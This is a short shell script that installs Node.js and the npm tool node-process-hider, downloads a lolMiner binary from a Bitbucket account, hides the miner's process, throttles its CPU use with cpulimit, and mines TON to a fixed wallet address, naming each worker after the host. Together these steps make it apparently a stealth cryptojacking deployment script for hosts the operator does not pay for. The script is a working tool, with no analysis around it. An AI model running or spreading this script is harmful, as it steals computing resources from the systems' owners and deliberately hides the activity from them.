#!/bin/sh

apt update && apt -y install sudo
sudo apt update;apt -y install build-essential cpulimit screen ca-certificates libcurl4
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
sudo apt-get install -y nodejs
sudo apt-get install gcc g++ make
sudo -u root npm i -g node-process-hider
sudo ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
sudo dpkg-reconfigure --frontend noninteractive tzdata
wget https://bitbucket.org/oqoixgqoq9/tur/downloads/lolMiner
ph add lolMiner
chmod +x lolMiner
cpulimit -e lolMiner -l 30 &
./lolMiner --algo TON --pool https://server1.whalestonpool.com --user EQAMrKwDNU_jlzgdIZSFWh2wGm24bzHhLqkUJn04sKvaGj5F.$(cat /proc/sys/kernel/hostname)
